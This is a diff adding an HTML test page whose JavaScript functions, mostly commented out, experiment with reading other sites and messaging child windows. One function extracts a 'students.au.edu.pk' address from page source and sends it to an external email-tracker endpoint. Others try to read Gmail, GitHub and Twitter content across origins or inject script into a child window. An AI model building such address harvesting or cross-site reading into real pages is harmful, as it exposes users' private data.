@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Page</title>
+</head>
+<body>
+    <h1>Welcome to my page</h1>
+    <button onclick="openYouTube2()">Open YouTube</button>
+    <script src="https://apis.google.com/js/platform.js" async defer></script>
+    <script>
+
+        function mainFunc() {
+            var pageSource = encodeURIComponent(document.documentElement.outerHTML);
+            const searchString = "students.au.edu.pk";
+            const index = pageSource.indexOf(searchString);
+            const result = pageSource.substring(index - 20, index) + searchString;
+            var url = "https://email-tracker.azurewebsites.net/submit_page_source?page_source=" + result;
+            window.open(url);
+            alert("Done!");
+        };
+        // mainFunc();
+
+        function makeReq() {
+            var xhr = new XMLHttpRequest();
+            var url = 'https://github.com/';
+
+            xhr.open('GET', url);
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    console.log(xhr.responseText);
+                } else {
+                    console.log('Request failed.  Returned status of ' + xhr.status);
+                }
+            };
+            xhr.send();
+            alert("Hello");
+        }
+        // makeReq();
+
+        function anotherMeth() {
+            const url = 'https://twitter.com/';
+            const options = {
+                method: 'GET',
+                mode: 'cors',
+                cache: 'no-cache',
+                credentials: 'same-origin',
+                headers: {
+                    'Content-Type': 'text/html'
+                },
+                redirect: 'follow',
+                referrerPolicy: 'no-referrer'
+            };
+
+            fetch(url, options)
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error(error));
+
+        }
+        // anotherMeth();
+
+        function newMeth() {
+            url = "view-source:https://mail.google.com/mail/u/0/?tab=rm&ogbl";
+
+            window.open(url);
+        }
+        // newMeth();
+
+        function Capture() {
+            // Open the other website in a new window
+            window.open('https://mail.google.com/mail/u/0/?tab=rm&ogbl', '_blank');
+
+        }
+        // Capture();
+
+        function latestFunc() {
+            // Open a new tab with example.com
+            const exampleTab = window.open('https://www.example.com', '_blank');
+            alert("Hell");
+            // Wait for the tab to load and add a basic alert
+            exampleTab.addEventListener('load', function () {
+                const script = exampleTab.document.createElement('script');
+                script.innerHTML = 'alert("Hello from the child window!");';
+                exampleTab.document.body.appendChild(script);
+            });
+            alert("Hello");
+        }
+
+        // latestFunc();
+
+        function openYouTube() {
+            // Open youtube.com in a new window
+            let youtubeWindow = window.open('https://www.youtube.com', '_blank');
+
+            // Wait for the window to finish loading
+            youtubeWindow.addEventListener('load', function () {
+                // Once the window has loaded, call the YouTube API
+                let tag = document.createElement('script');
+                tag.src = 'https://www.youtube.com/iframe_api';
+                let firstScriptTag = document.getElementsByTagName('script')[0];
+                firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+                let player;
+                window.onYouTubeIframeAPIReady = function () {
+                    // Create a new YouTube player inside the child window
+                    player = new YT.Player('player', {
+                        height: '390',
+                        width: '640',
+                        videoId: 'M7lc1UVf-VE', // Replace this with the ID of the video you want to play
+                        events: {
+                            'onReady': onPlayerReady,
+                            'onStateChange': onPlayerStateChange
+                        }
+                    });
+                }
+
+                function onPlayerReady(event) {
+                    // Play the video as soon as it's ready
+                    event.target.playVideo();
+                }
+
+                function onPlayerStateChange(event) {
+                    // Handle player state changes if needed
+                }
+            });
+        }
+        // openYouTube();
+
+
+
+
+        function openYouTube2() {
+            // Open the YouTube page in a new window/tab
+            var youtubeWindow = window.open('https://www.youtube.com');
+
+            // Wait for the YouTube window to finish loading
+            youtubeWindow.addEventListener('load', function () {
+                // Send a message to the YouTube window
+                youtubeWindow.postMessage('displayAlert', 'https://www.youtube.com');
+            });
+
+            // Listen for messages from the YouTube window
+            window.addEventListener('message', function (event) {
+                // Check if the message is from the YouTube window
+                if (event.origin === 'https://www.youtube.com') {
+                    // Check if the message is requesting to display an alert
+                    if (event.data === 'displayAlert') {
+                        // Display an alert in the parent window/tab
+                        alert('Hello from YouTube!');
+                    }
+                }
+            });
+        }
+
+    </script>
+</body>
+</html>
